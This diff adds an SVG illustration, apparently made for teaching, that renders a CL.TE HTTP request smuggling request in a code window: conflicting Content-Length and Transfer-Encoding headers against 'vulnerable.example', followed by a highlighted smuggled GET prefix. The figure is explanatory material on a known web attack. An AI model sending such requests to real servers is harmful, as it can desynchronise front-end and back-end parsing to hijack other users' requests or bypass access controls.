@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 405" role="img" aria-labelledby="title desc">
+  <title id="title">CL.TE request smuggling bytes</title>
+  <desc id="desc">A dark code window showing conflicting Content-Length and Transfer-Encoding headers.</desc>
+  <rect width="720" height="405" fill="#0f1117"/>
+  <circle cx="30" cy="30" r="6" fill="#dc2626"/><circle cx="52" cy="30" r="6" fill="#475569"/><circle cx="74" cy="30" r="6" fill="#475569"/>
+  <path d="M0 57h720" stroke="#334155"/>
+  <g transform="translate(-45 -45) scale(1.14)" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="20">
+    <text x="66" y="135" fill="#e2e8f0">POST / HTTP/1.1</text>
+    <text x="66" y="174" fill="#94a3b8">Host: vulnerable.example</text>
+    <text x="66" y="213" fill="#ef4444">Content-Length: 35</text>
+    <text x="66" y="252" fill="#ef4444">Transfer-Encoding: chunked</text>
+    <text x="66" y="300" fill="#64748b">0\r\n\r\n</text>
+    <rect x="62" y="317" width="526" height="38" rx="4" fill="#dc2626" opacity=".16"/>
+    <text x="72" y="343" fill="#e2e8f0">GET /404 HTTP/1.1\r\nX: x</text>
+  </g>
+</svg>
